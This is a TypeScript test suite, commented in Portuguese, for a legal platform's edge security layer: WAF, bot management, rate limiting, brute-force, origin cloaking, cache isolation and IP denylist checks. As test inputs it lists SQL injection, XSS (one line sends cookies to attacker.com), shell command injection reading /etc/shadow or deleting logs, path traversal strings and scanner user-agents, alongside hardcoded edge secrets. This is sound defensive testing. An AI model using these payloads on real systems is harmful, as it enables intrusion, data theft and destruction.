/**
 * tests/security/edgeSecurityAndWaf.test.ts — Legis Connect Master Suite 23
 * ─────────────────────────────────────────────────────────────────────────────
 * Suíte de Testes Automatizados do Escudo de Borda (Edge Security & WAF).
 * 
 * Cobertura:
 *   1. WAF SQL Injection Defense
 *   2. WAF Cross-Site Scripting (XSS) Defense
 *   3. WAF Command Injection (RCE) Defense
 *   4. WAF Path Traversal & Null Byte Defense
 *   5. WAF Scanner & Penetration Tool Detection
 *   6. Bot Management & Crawler Allowlist
 *   7. Multi-Dimensional Rate Limiting (por classe de rota)
 *   8. Anti-Brute Force & Credential Stuffing (Progressão ALLOW->THROTTLE->BLOCK)
 *   9. Origin Cloak Protection & Bypass Prevention
 *  10. Multi-Tenant Cache Security & Isolation
 *  11. Threat Intelligence & IP Reputation Governance
 *  12. Master EdgeShield Integration Pipeline
 * ─────────────────────────────────────────────────────────────────────────────
 */

import { WafEngine, HttpRequestContext } from '../../security/edge/wafEngine';
import { BotManagementEngine } from '../../security/edge/botManagementEngine';
import { RateLimitingEngine } from '../../security/edge/rateLimitingEngine';
import { BruteForceProtection } from '../../security/edge/bruteForceProtection';
import { OriginCloakProtection } from '../../security/edge/originCloakProtection';
import { ThreatIntelligence } from '../../security/edge/threatIntelligence';
import { MultiTenantCacheGuard } from '../../security/edge/multiTenantCacheGuard';
import { EdgeShield } from '../../api/_edge-shield';

function assert(condition: boolean, message: string): void {
  if (!condition) {
    throw new Error('ASSERTION FAILED: ' + message);
  }
}

export function runEdgeSecurityAndWafTests(): { passed: number; failed: number; suiteName: string } {
  let passed = 0;
  let failed = 0;
  const suiteName = 'Suíte 23: Escudo de Borda, WAF & Bot Management';

  console.log('────────────────────────────────────────────────────────────────');
  console.log('🛡️  INICIANDO SUÍTE 23: EDGE SECURITY, WAF & BOT DEFENSE');
  console.log('────────────────────────────────────────────────────────────────');

  // ── Teste 1: WAF Bloqueio de SQL Injection ──────────────────────────────────
  try {
    const sqliPayloads = [
      "admin' UNION SELECT username, password FROM users --",
      "' OR '1'='1",
      "1; DROP TABLE clients;",
      "'; EXEC xp_cmdshell('dir');--",
      "1' AND (SELECT 1 FROM (SELECT pg_sleep(5))a)--",
    ];

    for (const payload of sqliPayloads) {
      const result = WafEngine.inspectRequest({
        method: 'POST',
        url: '/api/query',
        path: '/api/query',
        headers: { 'content-type': 'application/json' },
        body: { search: payload },
      });
      assert(result.blocked, 'WAF deve bloquear payload SQLi: ' + payload);
      assert(result.action === 'BLOCK', 'Ação do WAF deve ser BLOCK para SQLi');
      assert(result.statusCode === 403, 'Status code deve ser 403 Forbidden');
    }

    console.log('  ✓ Teste 1/12: WAF SQL Injection Defense (5 vetores bloqueados)');
    passed++;
  } catch (err: any) {
    console.error('  ✗ Teste 1/12 Falhou:', err.message);
    failed++;
  }

  // ── Teste 2: WAF Bloqueio de XSS ───────────────────────────────────────────
  try {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror="document.cookie=\\"stolen\\"" />',
      'javascript:fetch("//attacker.com/"+document.cookie)',
      '<body onload=alert(document.domain)>',
    ];

    for (const payload of xssPayloads) {
      const result = WafEngine.inspectRequest({
        method: 'POST',
        url: '/api/profile',
        path: '/api/profile',
        headers: {},
        body: { bio: payload },
      });
      assert(result.blocked, 'WAF deve bloquear payload XSS: ' + payload);
    }

    console.log('  ✓ Teste 2/12: WAF Cross-Site Scripting (XSS) Defense (4 vetores)');
    passed++;
  } catch (err: any) {
    console.error('  ✗ Teste 2/12 Falhou:', err.message);
    failed++;
  }

  // ── Teste 3: WAF Bloqueio de Command Injection (RCE) ────────────────────────
  try {
    const rcePayloads = [
      '; cat /etc/passwd',
      '&& cat /etc/shadow',
      '|| whoami',
      '$( id )',
      '; rm -rf /var/log',
    ];

    for (const payload of rcePayloads) {
      const result = WafEngine.inspectRequest({
        method: 'GET',
        url: '/api/document?file=' + encodeURIComponent(payload),
        path: '/api/document',
        headers: {},
        query: { file: payload },
      });
      assert(result.blocked, 'WAF deve bloquear payload RCE: ' + payload);
    }

    console.log('  ✓ Teste 3/12: WAF Remote Command Execution (RCE) Defense (5 vetores)');
    passed++;
  } catch (err: any) {
    console.error('  ✗ Teste 3/12 Falhou:', err.message);
    failed++;
  }

  // ── Teste 4: WAF Path Traversal & Null Byte ─────────────────────────────────
  try {
    const traversalPayloads = [
      '../../../../etc/passwd',
      '..\\..\\boot.ini',
      'document.pdf%00.exe',
      '/var/www/uploads/../../../etc/shadow',
    ];

    for (const payload of traversalPayloads) {
      const result = WafEngine.inspectRequest({
        method: 'GET',
        url: '/download/' + payload,
        path: '/download/' + payload,
        headers: {},
      });
      assert(result.blocked, 'WAF deve bloquear Path Traversal: ' + payload);
    }

    console.log('  ✓ Teste 4/12: WAF Path Traversal & Null Byte Defense (4 vetores)');
    passed++;
  } catch (err: any) {
    console.error('  ✗ Teste 4/12 Falhou:', err.message);
    failed++;
  }

  // ── Teste 5: WAF Detecção de Scanners Automatizados ─────────────────────────
  try {
    const scannerAgents = [
      'sqlmap/1.6.12#stable (https://sqlmap.org)',
      'Mozilla/5.0 (compatible; Nikto/2.1.6)',
      'gobuster/3.1.0',
      'masscan/1.3.2',
    ];

    for (const agent of scannerAgents) {
      const result = WafEngine.inspectRequest({
        method: 'GET',
        url: '/api/health',
        path: '/api/health',
        headers: { 'user-agent': agent },
      });
      assert(result.blocked, 'WAF deve bloquear scanner conhecido: ' + agent);
    }

    console.log('  ✓ Teste 5/12: WAF Scanner & Exploit Tools Signature Blocking');
    passed++;
  } catch (err: any) {
    console.error('  ✗ Teste 5/12 Falhou:', err.message);
    failed++;
  }

  // ── Teste 6: Bot Management & Crawler Allowlist ─────────────────────────────
  try {
    // 1. Crawlers legítimos devem ser autorizados
    const googleResult = BotManagementEngine.classifyTraffic({
      method: 'GET',
      url: '/',
      path: '/',
      headers: { 'user-agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)' },
    });
    assert(googleResult.category === 'LEGITIMATE_BOT', 'Googlebot deve ser LEGITIMATE_BOT');
    assert(googleResult.action === 'ALLOW', 'Googlebot deve receber ALLOW');

    const uptimeResult = BotManagementEngine.classifyTraffic({
      method: 'GET',
      url: '/api/health',
      path: '/api/health',
      headers: { 'user-agent': 'BetterStack-Uptime-Monitor/2.0' },
    });
    assert(uptimeResult.category === 'LEGITIMATE_BOT', 'BetterStack deve ser LEGITIMATE_BOT');
    assert(uptimeResult.action === 'ALLOW', 'BetterStack deve receber ALLOW');

    // 2. Scanners maliciosos devem ser bloqueados
    const sqlmapResult = BotManagementEngine.classifyTraffic({
      method: 'GET',
      url: '/api/cases',
      path: '/api/cases',
      headers: { 'user-agent': 'sqlmap/1.5' },
    });
    assert(sqlmapResult.category === 'MALICIOUS_BOT', 'Sqlmap deve ser MALICIOUS_BOT');
    assert(sqlmapResult.action === 'BLOCK', 'Sqlmap deve receber BLOCK');

    console.log('  ✓ Teste 6/12: Bot Management — Allowlist Legítima vs Bloqueio de Scrapers');
    passed++;
  } catch (err: any) {
    console.error('  ✗ Teste 6/12 Falhou:', err.message);
    failed++;
  }

  // ── Teste 7: Multi-Dimensional Rate Limiting ────────────────────────────────
  try {
    RateLimitingEngine.clearAll();

    const testReq: HttpRequestContext = {
      method: 'POST',
      url: '/login',
      path: '/login',
      headers: {},
      ip: '198.51.100.99',
      userId: 'test_user',
      tenantId: 'tenant_alpha',
    };

    // 6 requisições consecutivas no login (limite = 5 + 1 burst = 6)
    for (let i = 1; i <= 6; i++) {
      const res = RateLimitingEngine.checkRateLimit(testReq);
      assert(res.allowed, 'Requisição ' + i + ' deve ser permitida dentro da janela');
    }

    // 7ª requisição deve exceder o limite
    const blockedRes = RateLimitingEngine.checkRateLimit(testReq);
    assert(!blockedRes.allowed, '7ª requisição de login deve ser bloqueada por Rate Limit');
    assert(blockedRes.remaining === 0, 'Remaining deve ser 0');
    assert(Boolean(blockedRes.retryAfterSeconds), 'Header Retry-After deve estar presente');

    console.log('  ✓ Teste 7/12: Multi-Dimensional Rate Limiting por Categoria de Endpoint');
    passed++;
  } catch (err: any) {
    console.error('  ✗ Teste 7/12 Falhou:', err.message);
    failed++;
  }

  // ── Teste 8: Anti-Brute Force Progressão (ALLOW -> THROTTLE -> BLOCK) ────────
  try {
    BruteForceProtection.clearAll();
    const attackerIp = '203.0.113.44';

    // Tentativas 1 a 2: ALLOW
    let evalRes = BruteForceProtection.recordAttempt(attackerIp, 'lawyer1@legis.com.br', false);
    evalRes = BruteForceProtection.recordAttempt(attackerIp, 'lawyer1@legis.com.br', false);
    assert(evalRes.tier === 'ALLOW', 'Até 2 falhas deve retornar ALLOW');

    // Tentativa 3 a 4: THROTTLE (atraso artificial de 1000ms)
    evalRes = BruteForceProtection.recordAttempt(attackerIp, 'lawyer1@legis.com.br', false);
    assert(evalRes.tier === 'THROTTLE', '3 falhas deve ativar THROTTLE');
    assert(evalRes.artificialDelayMs >= 1000, 'Atraso artificial deve ser >= 1000ms');

    // Tentativa 5 a 9: CHALLENGE (MFA requerido)
    evalRes = BruteForceProtection.recordAttempt(attackerIp, 'lawyer1@legis.com.br', false);
    evalRes = BruteForceProtection.recordAttempt(attackerIp, 'lawyer1@legis.com.br', false);
    assert(evalRes.tier === 'CHALLENGE', '5 falhas deve exigir CHALLENGE');

    // Password Spraying: atacando múltiplas contas diferentes pelo mesmo IP
    BruteForceProtection.recordAttempt(attackerIp, 'lawyer2@legis.com.br', false);
    evalRes = BruteForceProtection.recordAttempt(attackerIp, 'lawyer3@legis.com.br', false);
    assert(evalRes.isPasswordSpraying, 'Deve detectar Password Spraying em 3+ contas');

    // Acumulando falhas até BLOCK
    for (let i = 0; i < 5; i++) {
      evalRes = BruteForceProtection.recordAttempt(attackerIp, 'admin@legis.com.br', false);
    }
    assert(evalRes.tier === 'BLOCK', '10 falhas deve resultar em BLOCK');
    assert(evalRes.blocked, 'Flag blocked deve ser true');

    console.log('  ✓ Teste 8/12: Anti-Brute Force — Degradação Progressiva & Spraying Detection');
    passed++;
  } catch (err: any) {
    console.error('  ✗ Teste 8/12 Falhou:', err.message);
    failed++;
  }

  // ── Teste 9: Origin Cloak Protection & Bypass Prevention ─────────────────────
  try {
    OriginCloakProtection.setExpectedSecret('PROD_SECRET_XYZ_999');

    // Requisição com secret válido de borda
    const validReq = OriginCloakProtection.validateOriginRequest({
      method: 'GET',
      url: '/api/health',
      path: '/api/health',
      headers: { 'x-legis-edge-secret': 'PROD_SECRET_XYZ_999' },
    });
    assert(validReq.valid, 'Requisição com token de borda deve ser válida');

    // Requisição direta à origem sem token (enforcement ativo)
    process.env.ENFORCE_ORIGIN_CLOAK = 'true';
    const directReq = OriginCloakProtection.validateOriginRequest({
      method: 'GET',
      url: '/api/cases',
      path: '/api/cases',
      headers: {},
    });
    assert(!directReq.valid, 'Acesso direto sem token de borda deve ser rejeitado');
    assert(directReq.statusCode === 403, 'Acesso direto deve retornar 403');
    delete process.env.ENFORCE_ORIGIN_CLOAK;
    OriginCloakProtection.setExpectedSecret('LEGIS_ENTERPRISE_EDGE_DEFAULT_SECRET_2026');

    console.log('  ✓ Teste 9/12: Origin Cloak Protection & Anti-Bypass Validation');
    passed++;
  } catch (err: any) {
    console.error('  ✗ Teste 9/12 Falhou:', err.message);
    failed++;
  }

  // ── Teste 10: Multi-Tenant Cache Guard ──────────────────────────────────────
  try {
    // Rota com autenticação ou tenant
    const authPolicy = MultiTenantCacheGuard.evaluateCachePolicy('/api/cases', true);
    assert(authPolicy.isPrivate, 'Rotas com dados de tenant devem ser estritamente private');
    assert(authPolicy.cacheControl.includes('no-store'), 'Cache deve conter no-store');
    assert(authPolicy.tenantPartitioned, 'Chave de cache deve ser particionada');

    // Validação de cabeçalho inseguro
    const unsafeCheck = MultiTenantCacheGuard.validateResponseHeaders({
      'cache-control': 'public, max-age=3600',
    });
    assert(!unsafeCheck.safe, 'Cache-Control public em rota protegida deve ser sinalizado como inseguro');

    console.log('  ✓ Teste 10/12: Multi-Tenant Cache Guard & Cross-Tenant Leakage Prevention');
    passed++;
  } catch (err: any) {
    console.error('  ✗ Teste 10/12 Falhou:', err.message);
    failed++;
  }

  // ── Teste 11: Threat Intelligence & IP Reputation Governance ─────────────────
  try {
    ThreatIntelligence.clearAll();

    ThreatIntelligence.blockIp({
      ipOrCidr: '198.51.100.14',
      reason: 'Automated SQLi scanner detected',
      category: 'MALICIOUS_SCANNER',
      responsible: 'SOC Analyst',
      addedAt: '2026-08-25T00:00:00Z',
      expiresAt: '2026-09-25T00:00:00Z',
      status: 'ACTIVE',
    });

    const threatCheck = ThreatIntelligence.checkIpReputation('198.51.100.14');
    assert(threatCheck.isThreat, 'IP bloqueado na denylist deve ser classificado como ameaça');
    assert(threatCheck.action === 'BLOCK', 'Ação para IP em denylist deve ser BLOCK');

    const cleanCheck = ThreatIntelligence.checkIpReputation('192.0.2.1');
    assert(!cleanCheck.isThreat, 'IP sem histórico não deve ser bloqueado');

    console.log('  ✓ Teste 11/12: Threat Intelligence & Governança de Denylist');
    passed++;
  } catch (err: any) {
    console.error('  ✗ Teste 11/12 Falhou:', err.message);
    failed++;
  }

  // ── Teste 12: Master EdgeShield Pipeline Integration ────────────────────────
  try {
    // 1. Requisição maliciosa barrada no WAF via EdgeShield
    const badShieldEval = EdgeShield.evaluateRequest({
      method: 'POST',
      url: '/api/gemini',
      headers: { 'x-legis-edge-secret': 'LEGIS_ENTERPRISE_EDGE_DEFAULT_SECRET_2026' },
      body: { contents: "' UNION SELECT * FROM users --" },
    });
    assert(!badShieldEval.allowed, 'EdgeShield deve bloquear requisição maliciosa');
    assert(badShieldEval.statusCode === 403, 'Status code da avaliação deve ser 403');
    assert(badShieldEval.wafAssessment.blocked, 'WAF assessment deve ser blocked');

    // 2. Requisição legítima aprovada
    const cleanShieldEval = EdgeShield.evaluateRequest({
      method: 'POST',
      url: '/api/gemini',
      headers: {
        'x-legis-edge-secret': 'LEGIS_ENTERPRISE_EDGE_DEFAULT_SECRET_2026',
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
        'accept-language': 'pt-BR,pt;q=0.9',
      },
      body: { contents: [{ role: 'user', parts: [{ text: 'Elabore uma petição inicial de cobrança.' }] }] },
    });
    assert(cleanShieldEval.allowed, 'EdgeShield deve permitir requisição legítima');
    assert(cleanShieldEval.statusCode === 200, 'Status code deve ser 200');

    console.log('  ✓ Teste 12/12: Master EdgeShield Integration Pipeline End-to-End');
    passed++;
  } catch (err: any) {
    console.error('  ✗ Teste 12/12 Falhou:', err.message);
    failed++;
  }

  console.log('────────────────────────────────────────────────────────────────');
  console.log('📊 RESULTADO SUÍTE 23: ' + passed + '/12 Testes Aprovados (' + (failed === 0 ? '100% SUCESSO' : 'FALHAS DETECTADAS') + ')');
  console.log('────────────────────────────────────────────────────────────────\n');

  return { passed, failed, suiteName };
}

